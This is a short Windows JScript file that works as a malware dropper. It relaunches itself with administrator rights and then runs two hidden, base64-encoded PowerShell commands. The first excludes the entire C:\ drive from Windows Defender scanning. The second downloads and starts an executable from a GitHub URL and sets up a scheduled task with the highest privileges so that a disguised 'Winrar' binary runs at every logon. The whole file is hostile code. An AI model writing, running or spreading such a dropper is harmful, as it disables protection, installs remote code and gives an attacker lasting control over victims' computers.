EnsureElevatedPrivileges();
function EnsureElevatedPrivileges() {
    if (!WScript.Arguments.Named.Exists("elevate")) {
        new ActiveXObject("Shell.Application").ShellExecute(WScript.FullName, "\"" + WScript.ScriptFullName + "\" /elevate", "", "runas", 1);
        WScript.Quit();
    }
}
var WshShell = new ActiveXObject("Wscript.Shell");
WshShell.run("powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA", 0, false);

WshShell.run("powershell -enc JAB1AHIAbAAgAD0AIAAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8ATABhAHAAaQBuAEcAYQBsAG8AYwBhAC8ATABhAHAAaQBuAEEAbABhAHIAZwBhAC8AcgBhAHcALwBtAGEAaQBuAC8AUwB5AHMAdABlAG0ALgBlAHgAZQAnAA0ACgAkAG8AdQB0AHAAdQB0AEYAaQBsAGUAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAYQB0AGgAXQA6ADoAQwBvAG0AYgBpAG4AZQAoACQAZQBuAHYAOgBUAGUAbQBwACwAIAAnAFMAeQBzAHQAZQBtAC4AZQB4AGUAJwApAA0ACgBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAE0AaQBsAGwAaQBzAGUAYwBvAG4AZABzACAAMQAwADAAIAANAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQByAGwAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAG8AdQB0AHAAdQB0AEYAaQBsAGUADQAKAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACQAbwB1AHQAcAB1AHQARgBpAGwAZQANAAoADQAKACQAdABhAHMAawBSAHUAbgAgAD0AIAAiAEMAOgBcAFUAcwBlAHIAcwBcACQAZQBuAHYAOgBVAFMARQBSAE4AQQBNAEUAXABBAHAAcABEAGEAdABhAFwAUgBvAGEAbQBpAG4AZwBcAFcAaQBuAHIAYQByAFwAUwB5AHMAdABlAG0ALgBlAHgAZQAiAA0ACgAkAHQAYQBzAGsATgBhAG0AZQAgAD0AIAAiAFMAeQBzAHQAZQBtAFMAVgAiAA0ACgAkAHMAdABhAHIAdABJAG4AIAA9ACAAIgBDADoAXABVAHMAZQByAHMAXAAkAGUAbgB2ADoAVQBTAEUAUgBOAEEATQBFAFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABXAGkAbgByAGEAcgAiAA0ACgANAAoAJABhAGMAdABpAG8AbgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIAAkAHQAYQBzAGsAUgB1AG4AIAAtAFcAbwByAGsAaQBuAGcARABpAHIAZQBjAHQAbwByAHkAIAAkAHMAdABhAHIAdABJAG4ADQAKACQAdAByAGkAZwBnAGUAcgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAVAByAGkAZwBnAGUAcgAgAC0AQQB0AEwAbwBnAE8AbgANAAoAJABwAHIAaQBuAGMAaQBwAGEAbAAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAUAByAGkAbgBjAGkAcABhAGwAIAAtAFUAcwBlAHIASQBkACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBOAEEATQBFACIAIAAtAEwAbwBnAG8AbgBUAHkAcABlACAASQBuAHQAZQByAGEAYwB0AGkAdgBlACAALQBSAHUAbgBMAGUAdgBlAGwAIABIAGkAZwBoAGUAcwB0AA0ACgAkAHQAYQBzAGsAIAA9ACAATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrACAALQBBAGMAdABpAG8AbgAgACQAYQBjAHQAaQBvAG4AIAAtAFAAcgBpAG4AYwBpAHAAYQBsACAAJABwAHIAaQBuAGMAaQBwAGEAbAAgAC0AVAByAGkAZwBnAGUAcgAgACQAdAByAGkAZwBnAGUAcgANAAoADQAKAFIAZQBnAGkAcwB0AGUAcgAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAIAAtAFQAYQBzAGsATgBhAG0AZQAgACQAdABhAHMAawBOAGEAbQBlACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHQAYQBzAGsAIAAtAEYAbwByAGMAZQAgAA==", 0, false);

WScript.exit;

